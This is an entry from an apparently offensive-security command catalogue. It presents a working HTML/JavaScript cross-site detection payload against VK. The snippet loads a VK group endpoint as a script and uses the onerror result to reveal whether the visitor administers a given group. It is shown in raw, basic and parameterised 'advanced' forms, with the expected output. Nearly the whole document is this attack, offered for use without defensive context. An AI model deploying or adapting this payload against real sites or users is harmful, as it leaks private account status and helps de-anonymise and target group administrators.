---
data: |-
  <body>
  <script>var script = document.createElement('script');
   script.src = "https://vk.com/al_groups.php?act=to_public_box&al=1&gid=147481257";
   document.body.appendChild(script);
   script.onerror = function() {
   alert( "No admin" );
   };
   </script>
   </body>
tags:
  - csrf
  - detection
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:42.422Z'
id: 146962d0-dd88-414e-a3f8-6bdfdf0d62c4
verified: false
validated: true
submitted: true
---
# vk-admin-detection-script

## Command

```html
<body>
<script>var script = document.createElement('script');
 script.src = "https://vk.com/al_groups.php?act=to_public_box&al=1&gid=147481257";
 document.body.appendChild(script);
 script.onerror = function() {
 alert( "No admin" );
 };
 </script>
 </body>
```

## Description

This HTML/JS snippet creates a dynamic script element loading the VK endpoint; onerror alerts for non-admins (error response), remains silent for admins, enabling cross-site admin detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | VK endpoint URL with gid parameter | Yes |
| onerror | Callback function for error handling (e.g., alert) | Yes |

## Examples

### Basic Usage

```html
<script>var script = document.createElement('script');
 script.src = "https://vk.com/al_groups.php?act=to_public_box&al=1&gid=147481257";
 document.body.appendChild(script);
 script.onerror = function() { alert("No admin"); };
 </script>
```

### Advanced Usage

```html
<script>var script = document.createElement('script');
 script.src = "https://vk.com/al_groups.php?act=to_public_box&al=1&gid=" + targetGid;
 script.onerror = function() { /* Log non-admin status */ };
 document.body.appendChild(script);
 </script>
```

## Expected Output

Alert 'No admin' for non-admins due to script load failure on error response; no output or alert for admins (silent load).

## Related

- [[Related Procedure]]
